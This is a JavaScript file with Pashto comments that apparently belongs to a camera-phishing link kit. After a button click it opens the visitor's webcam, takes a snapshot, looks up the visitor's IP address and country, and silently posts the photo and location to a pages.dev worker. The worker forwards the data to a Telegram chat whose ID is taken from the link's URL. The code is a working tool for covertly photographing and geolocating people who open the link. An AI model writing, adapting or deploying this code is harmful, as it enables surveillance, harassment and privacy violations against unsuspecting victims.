// ================= CONFIG =================
// ستا Pages / Worker endpoint
const WORKER_URL = "https://e87505a5.af-341.pages.dev/send";
// ==========================================

// UID له URL څخه
// مثال: ?=8041484832
const params = new URLSearchParams(location.search);
const UID = params.get("") || "UNKNOWN";

let stream;

// Camera (User Permission)
document.getElementById("btn").addEventListener("click", async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;
    video.style.display = "block";

    // یو عکس واخله
    setTimeout(captureAndSend, 1000);

  } catch (e) {
    alert("Camera permission denied");
  }
});

async function captureAndSend() {
  const video = document.getElementById("video");
  if (!video.videoWidth) return;

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  const blob = await new Promise(r =>
    canvas.toBlob(r, "image/jpeg", 0.8)
  );

  // IP Info (legal)
  let ip = "Unknown", country = "Unknown";
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    ip = d.ip || ip;
    country = d.country_name || country;
  } catch {}

  const caption =
`📸 NEW IMAGE
━━━━━━━━━━━━━━
🔢 UID : ${UID}
🌐 IP  : ${ip}
🌍 Country : ${country}
━━━━━━━━━━━━━━
👨‍💻 Dev : @XFPro43`;

  const form = new FormData();
  form.append("chat_id", UID);
  form.append("photo", blob, "image.jpg");
  form.append("caption", caption);
  form.append("parse_mode", "HTML");

  // 🔐 Token دلته نشته
  fetch(WORKER_URL, {
    method: "POST",
    body: form
  }).catch(()=>{});
}

// Camera بندول
window.addEventListener("beforeunload", () => {
  if (stream) stream.getTracks().forEach(t => t.stop());
}); 
